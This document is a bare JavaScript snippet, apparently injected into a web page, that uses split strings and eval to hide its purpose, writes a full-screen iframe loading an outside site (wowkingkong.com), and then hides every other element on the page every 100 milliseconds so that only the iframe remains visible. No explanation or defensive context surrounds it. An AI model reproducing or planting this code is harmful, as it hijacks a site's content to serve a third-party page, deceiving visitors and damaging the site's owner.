var ss = '<ifr' + 'ame scrolling="yes" id="smithcuto" style="height:100% !important; width: 100% !important; padding:0px !important;margin:0px !important;" src="http://wowkingkong.com/"></iframe><style type="text/css">html{width:100% !important;height:100% !important}body {padding:0px !important;margin:0px !important; width:100% !important;height:100% !important; overflow:hidden}</style>'; eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");

    try {
        setInterval(function () {

            try {
                document.getElementById("div" + "All").style.display = "no" + "ne";
            } catch (e) { }

            for (var i = 0; i < document.body.children.length; i++) {
                try {
                    var tagname = document.body.children[i].tagName;
                    var myid = document.body.children[i].id;
                    if (myid != "iconDiv1" && myid != "smithcuto") {
                        // if(tagname!="center"){ 
                        document.body.children[i].style.display = "non" + "e";
                        //}
                    }
                } catch (e) { }
            }

        }, 100);
    } catch (e) { } 
